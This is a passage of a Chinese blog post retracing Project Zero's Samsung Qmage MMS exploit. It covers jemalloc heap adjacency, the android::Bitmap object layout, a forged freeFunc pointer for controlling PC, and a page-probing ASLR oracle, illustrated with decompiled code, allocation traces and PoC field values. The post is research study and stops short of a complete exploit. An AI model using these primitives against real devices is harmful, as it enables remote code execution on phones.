      v4 = a3;
      SkImageInfoUnit = a2;
      v6 = this;
      v7 = a4;
      result = calloc();
      if ( result )
      {
        addr = result;
        bitmap = operator new(0xA0uLL);
        v11 = *(_QWORD *)(v4 + 8);
        *(_DWORD *)(bitmap + 8) = 1;
        *(_QWORD *)(bitmap + 0x18) = addr;
        *(_QWORD *)(bitmap + 0x20) = SkImageInfoUnit;
        *(_DWORD *)(bitmap + 0x30) = 1;
        *(_BYTE *)(bitmap + 0x34) = 0;
        *(_QWORD *)(bitmap + 0x40) = 0LL;
        *(_QWORD *)(bitmap + 0x48) = 0LL;
        *(_QWORD *)(bitmap + 0x38) = 0LL;
        *(_BYTE *)(bitmap + 0x50) = 0;
        bitmap_1 = bitmap;
        *(_QWORD *)bitmap = 0x10LL;
        *(_QWORD *)(bitmap + 0xC) = v11;
        __stlr(0, (unsigned int *)(bitmap + 0x28));
        *(_BYTE *)(bitmap + 0x51) = 0;
        *(_QWORD *)bitmap = 0x10LL;
        result = sub_446390(v4);
        *(_BYTE *)(bitmap_1 + 0x7C) = 0;
        *(_QWORD *)(bitmap_1 + 0x98) = 0LL;
        *(_QWORD *)(bitmap_1 + 0x80) = addr;
        *(_QWORD *)(bitmap_1 + 0x88) = v6;
        *(_DWORD *)(bitmap_1 + 0x78) = -1;
        *(_QWORD *)(bitmap_1 + 0x70) = 1LL;
        *v7 = bitmap_1;
      }
      else
      {
        *v7 = 0LL;
      }
      return result;
    }
这里的话为了来验证这两个位图相关的分配操作所分配的堆块是否可以是紧邻的，将Qmage文件大小更改为10×4，这样像素缓冲区就变成160(或者129到160之间的任何长度，这是相关的jemalloc
bin大小)，这样的话malloc分配的堆块和calloc分配的堆块有更大的可能性分配到一类中
    [15699] calloc(160, 1) => 0x7b88feb8c0
        0x7cbba83684 libhwui.so!android::Bitmap::allocateHeapBitmap+0x34
        0x7cbba88b54 libhwui.so!android::Bitmap::allocateHeapBitmap+0x9c
        0x7cbd827178 libandroid_runtime.so!HeapAllocator::allocPixelRef+0x28
        0x7cbbd1ae80 libhwui.so!SkBitmap::tryAllocPixels+0x50
        0x7cbd820ae8 libandroid_runtime.so!0x187ae8
        0x7cbd81fc8c libandroid_runtime.so!0x186c8c
        0x70a04ff0 boot-framework.oat!0x2bbff0
    [15699] malloc(160) => 0x7b88feb960
        0x7cbddd35c4 libc++.so!operator new+0x24
        0x7cbe582608
这里的话发现堆块确实是紧邻的，0x7b88feb960和0x7b88feb8c0相差0x160大小，经实验这两个堆块可以稳定分配利用
这里的话可以看下android::Bitmap结构的布局，根据C++
继承，虚表等点可以得到，然后根据一般利用C++结构体的写exp的思路，会关注各类函数指针或者只想缓冲区的指针等，用以后续覆盖伪造
    struct android::Bitmap {
      /* +0x00 */ void *vtable;
      //
      // class SK_API SkRefCntBase
      //
      /* +0x08 */ mutable std::atomic fRefCnt;
      //
      // class SK_API SkPixelRef : public SkRefCnt
      //
      /* +0x0C */ int     fWidth;
      /* +0x10 */ int     fHeight;
      /* +0x18 */ void*   fPixels;
      /* +0x20 */ size_t  fRowBytes;
      /* +0x28 */ mutable std::atomic fTaggedGenID;
      struct /* SkIDChangeListener::List */ {
      /* +0x30 */ std::atomic fCount;
      /* +0x34 */ SkOnce           fOSSemaphoreOnce;
      /* +0x38 */ OSSemaphore*     fOSSemaphore;
      } fGenIDChangeListeners;
      struct /* SkTDArray */ {
      /* +0x40 */ SkIDChangeListener* fArray;
      /* +0x48 */ int                 fReserve;
      /* +0x4C */ int                 fCount;
      } fListeners;
      /* +0x50 */ std::atomic fAddedToCache;
      /* +0x51 */ enum Mutability {
      /* +0x51 */   kMutable,
      /* +0x51 */   kTemporarilyImmutable,
      /* +0x51 */   kImmutable,
      /* +0x51 */ } fMutability : 8;
      //
      // class ANDROID_API Bitmap : public SkPixelRef
      //
      struct /* SkImageInfo */ {
      /* +0x58 */ sk_sp fColorSpace;
      /* +0x60 */ int fWidth;
      /* +0x64 */ int fHeight;
      /* +0x68 */ SkColorType fColorType;
      /* +0x6C */ SkAlphaType fAlphaType;
      } mInfo;
      /* +0x70 */ const PixelStorageType mPixelStorageType;
      /* +0x74 */ BitmapPalette mPalette;
      /* +0x78 */ uint32_t mPaletteGenerationId;
      /* +0x7C */ bool mHasHardwareMipMap;
      union {
        struct {
      /* +0x80 */ void* address;
      /* +0x88 */ void* context;
      /* +0x90 */ FreeFunc freeFunc;
        } external;
        struct {
      /* +0x80 */ void* address;
      /* +0x88 */ int fd;
      /* +0x90 */ size_t size;
        } ashmem;
        struct {
      /* +0x80 */ void* address;
      /* +0x88 */ size_t size;
        } heap;
        struct {
      /* +0x80 */ GraphicBuffer* buffer;
        } hardware;
      } mPixelStorage;
      /* +0x98 */ sk_sp mImage;
    };
构造代码执行原语
这里的原作寻找的方式是通过填充Bitmap中各个结构体的方法去寻找的，然后查看这些因函数指针或者其他元素触发崩溃的栈回溯，根据是否是因为访问了非法地址（及填充的畸形数据）而导致的崩溃可以去找寻到能够控制
pc 指针的漏洞，这里的话作者最终定位到了 Bitmap::~Bitmap destructor中
mPixelStorage,external的freeFunc函数
    case PixelStorageType::External:
      mPixelStorage.external.freeFunc(mPixelStorage.external.address, mPixelStorage.external.context);
      break;
因此，此poc也十分好写，参考上面Bitmap结构，可以将将Bitmap.external作如下设置
    vtable 还是原来的值
    fRefCnt = 1
    mPixelStorageType = 0 （这个是switch判断选择exteral的case处理选项）
    mPixelStorage.external.address = 0xaaaaaaaaaaaaaaaa
    mPixelStorage.external.context = 0xbbbbbbbbbbbbbbbb
    mPixelStorage.external.freeFunc = 0xcccccccccccccccc
构造ASLR oracle原语
这里的原语是希望能够找寻到一个可泄露地址的工具，那做法和上面类似，也是通过崩溃进程和内存布局联系起来，Bitmap对象还包含其他一些可以尝试定位的指针，可以用0x41覆盖整个区域，然后查看进程如何崩溃，以确定访问哪些指针，在何处以及如何访问。
这里最终定位到了一个循环语句中（在此之前都是些对位图基本属性的复制，合理性检查）
    for (int y = 0; y (dstPixels, dstRB);
      srcPixels = SkTAddOffset(srcPixels, srcRB);
    }
那就是从BGRA到RGBA转换的地方。 在这段代码段中，大多数变量的值都来自被我们伪造的android::Bitmap对象：
    dstInfo.height() == mInfo.height
    dstInfo.width() == mInfo.width
    srcPixels == fPixels
    srcRB == fRowBytes
也就是是说我们通过这个转换我们可以达到更大的灵活性，因为之前读取的数据大部分是像素信息和代码流程关系不大，但是这里的话可以尝试去访问更多的地址
  * fPixels（偏移量0x18）-> 所探测的地址范围的开始
  * mInfo.fHeight（偏移量0x64）-> 要探测的页面数
这将导致Skia在mInfo.fHeight迭代中从fPixels地址开始以0x1000字节间隔大小读取四个字节。这等效于探索任意连续内存区域的是否可读，如果所有页面均已映射带有可读属性，则循环顺利结束，并且测试进程将保持存活状态；否则，它将在遇到访问测试范围内的第一个不可读页面时就会发生崩溃。也就是说，这个循环可以作为内存的探针
至此算是完成了编写exp的前期准备，这里的思路大致可以归纳为
  1. 品相好的内存破坏漏洞
  2. 测试结构体内的函数指针
  3. 测试代码可触发到的路径
  4. 从影响到的代码块中找寻可以对内存访问或者泄露地址的原语
由于后续的exp编写复现需要相应的设备，只能等以后补齐设备后在写下文了
参考阅读：
  * [MMS Exploit Part 1: Introduction to the Samsung Qmage Codec and Remote Attack Surface](https://googleprojectzero.blogspot.com/2020/07/mms-exploit-part-1-introduction-to-qmage.html)
  * [MMS Exploit Part 2: Effective Fuzzing of the Qmage Codec](https://googleprojectzero.blogspot.com/2020/07/mms-exploit-part-2-effective-fuzzing-qmage.html)
  * [MMS Exploit Part 3: Constructing the Memory Corruption Primitives](https://googleprojectzero.blogspot.com/2020/07/mms-exploit-part-3-constructing-primitives.html)
  * [MMS Exploit Part 4: MMS Primer, Completing the ASLR Oracle](https://googleprojectzero.blogspot.com/2020/08/mms-exploit-part-4-completing-aslr-oracle.html)
  * [MMS Exploit Part 5: Defeating Android ASLR, Getting RCE](https://googleprojectzero.blogspot.com/2020/08/mms-exploit-part-5-defeating-aslr-getting-rce.html)